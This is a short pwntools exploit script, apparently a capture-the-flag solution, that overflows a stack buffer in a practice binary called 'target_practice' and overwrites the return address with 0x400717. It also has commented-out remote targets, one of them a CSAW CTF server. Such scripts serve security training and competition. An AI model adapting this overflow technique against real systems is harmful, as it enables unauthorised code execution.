from pwn import *
context.terminal=['tmux','splitx','-h']
context.log_level='debug'

# p=remote("121.37.132.113",10001)
# p=remote("intro.csaw.io",31138)

p=process("./target_practice")

addr=0x400717

# pr=0x4007a7

payload=0x18*b'A'+8*b'B'+p64(addr)
# # payload=b'233'
p.sendafter(b'Aim carefully.... ',payload)

# p.sendline(payload)
p.interactive()